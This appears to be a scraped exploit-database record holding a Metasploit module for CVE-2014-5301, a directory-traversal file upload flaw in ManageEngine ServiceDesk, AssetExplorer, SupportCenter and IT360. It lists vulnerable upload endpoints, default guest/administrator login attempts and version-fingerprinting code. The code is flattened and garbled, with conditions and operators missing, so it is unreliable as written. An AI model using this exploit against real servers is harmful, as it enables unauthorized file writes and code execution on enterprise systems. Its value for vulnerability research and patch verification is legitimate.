{
    "text": "vul_name : ManageEngine Multiple Products Authenticated File Upload ， vul_cve : CVE-2014-5301 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， require 'msf/core' ， class Metasploit3 < Msf : Exploit : Remote ， Rank = ExcellentRanking ， include Msf : Exploit : Remote : HttpClient ， super ( update_info ( info ,  ， 'Name' => 'ManageEngine Multiple Products Authenticated File Upload' ,  ， 'Description' => %q{ ， This module exploits a directory traversal vulnerability in ManageEngine ServiceDesk ,  ， AssetExplorer , SupportCenter and IT360 when uploading attachment files. The JSP that accepts ， the upload does not handle correctly './' sequences , which can be abused to write ， in the file system. Authentication is needed to exploit this vulnerability , but this module ， will attempt to login using the default credentials for the administrator and guest ， accounts. Alternatively you can provide a pre-authenticated cookie or a username / password ， combo. For IT360 targets enter the RPORT of the ServiceDesk instance ( usually 8400 ) . All ， versions of ServiceDesk prior v9 build 9031 ( including MSP but excluding v4 )  , AssetExplorer ,  ， SupportCenter and IT360 ( including MSP ) are vulnerable. At the time of release of this ， module , only ServiceDesk v9 has been fixed in build 9031 and above. This module has been ， been tested successfully in Windows and Linux on several versions. ， } ,  ， 'Author' => ，  [  ， 'Pedro Ribeiro <pedrib [ at ] gmail.com>' # Vulnerability Discovery and Metasploit module ，  ]  ,  ， 'License' => MSF_LICENSE ,  ， ' ，  [  ，  [ 'CVE' , '2014-5301' ]  ,  ，  [ 'OSVDB' , '116733' ]  ,  ，  [ 'URL' , ' ，  [ 'URL' , ' ，  ]  ,  ， 'DefaultOptions' => { 'WfsDelay' => 30 } ,  ， 'Privileged' => false ,  # Privileged on Windows but not on Linux targets ， 'Platform' => 'java' ,  ， 'Arch' => ARCH_JAVA ,  ， 'Targets' => ，  [  ，  [ 'Automatic' , { } ]  ,  ，  [ 'ServiceDesk Plus v5-v7.1 < b7016/AssetExplorer v4/SupportCenter v5-v7.9' ,  ， { ， 'attachment_path' => '/workorder/Attachment.jsp' ， } ，  ]  ,  ，  [ 'ServiceDesk Plus/Plus MSP v7.1 >= b7016 - v9.0 < b9031/AssetExplorer v5-v6.1' ,  ， { ， 'attachment_path' => '/common/FileAttachment.jsp' ， } ，  ]  ,  ，  [ 'IT360 v8-v10.4' ,  ， { ， 'attachment_path' => '/common/FileAttachment.jsp' ， } ，  ]  ，  ]  ,  ， 'DefaultTarget' => 0 ,  ， 'DisclosureDate' => 'Dec 15 2014' )  ， register_options (  ，  [  ， Opt : RPORT ( 8080 )  ,  ， OptString.new ( 'JSESSIONID' ,  ，  [ false , 'Pre-authenticated JSESSIONID cookie ( non-IT360 targets ) ' ]  )  ,  ， OptString.new ( 'IAMAGENTTICKET' ,  ，  [ false , 'Pre-authenticated IAMAGENTTICKET cookie ( IT360 target only ) ' ]  )  ,  ， OptString.new ( 'USERNAME' ,  ，  [ true , 'The username to login as' , 'guest' ]  )  ,  ， OptString.new ( 'PASSWORD' ,  ，  [ true , 'Password for the specified username' , 'guest' ]  )  ,  ， OptString.new ( 'DOMAIN_NAME' ,  ，  [ false , 'Name of the domain to logon to' ]  )  ，  ]  , self.class )  ， end ， def get_version ， res = send_request_cgi ( { ， 'uri' => '/' ,  ， 'method' => 'GET' ， } )  ，  # Major version , minor version , build and product ( sd = servicedesk ; ae = assetexplorer ; sc = supportcenterl ; it = it360 )  ， version = [ 9999 , 9999 , 0 , 'sd' ]  ， output = $ 1 ， version = [ output [ 0 ] .to_i , output [ 2 ] .to_i , '0' , 'sd' ]  ， end ， version [ 2 ] = $ 1.to_i ， elsif res.body.to_s = ~ /'\\/style\\/style\\.css' , ' (  [ 0-9 ] + ) '\\ )  ; <\\/script>/ # older builds ， version [ 2 ] = $ 1.to_i ， end ， elsif res.body.to_s = ~ /ManageEngine AssetExplorer/ ， res.body.to_s = ~ /<div class=\"login-versioninfo\">version&nbsp ;  (  [ 0-9 ] {1}\\.{1} [ 0-9 ] {1}\\.? [ 0-9 ]  *  ) <\\/div>/ ， output = $ 1 ， version = [ output [ 0 ] .to_i , output [ 2 ] .to_i , 0 , 'ae' ]  ， end ， version [ 2 ] = $ 1.to_i ， end ， elsif res.body.to_s = ~ /ManageEngine SupportCenter Plus/ ，  # All of the vulnerable sc installations are \"old style\" , so we don't care about the major / minor version ， version [ 3 ] = 'sc' ，  # . but get the build number if we can find it ， version [ 2 ] = $ 1.to_i ， end ， elsif res.body.to_s = ~ /\\/console\\/ConsoleMain\\.cc/ ，  # IT360 newer versions ， version [ 3 ] = 'it' ， end ， elsif res res.code = 302 res.get_cookies.to_s = ~ /IAMAGENTTICKET (  [ A-Z ] {0 , 4} ) / ，  # IT360 older versions , not a very good detection string but there is no alternative? ， version [ 3 ] = 'it' ， end ， version ， end ， def check ， version = get_version ，  # TODO : put fixed version on the two ifs below once ( if. ) products are fixed ，  # sd was fixed on build 9031 ，  # ae and sc still not fixed ，  ( version [ 0 ] <= 6 version [ 2 ] < 99999 version [ 3 ] = 'ae' )  |  ，  ( version [ 3 ] = 'sc' version [ 2 ] < 99999 ) ",
    "time": "2015.01.20"
}